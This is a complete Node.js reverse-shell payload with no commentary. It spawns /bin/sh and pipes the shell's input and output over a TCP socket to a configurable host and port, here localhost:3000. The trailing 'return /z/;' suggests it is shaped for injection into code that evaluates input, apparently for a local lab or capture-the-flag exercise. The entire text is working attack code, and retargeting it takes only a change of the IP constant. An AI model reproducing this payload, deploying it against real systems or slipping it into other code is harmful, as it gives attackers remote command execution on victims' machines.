(function(){
    const IP = "localhost";
    const PORT = 3000;
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var x = new net.Socket();
    x.connect(PORT, IP, function(){
        x.pipe(sh.stdin);
        sh.stdout.pipe(x);
        sh.stderr.pipe(x);
    });
    return /z/;
})();
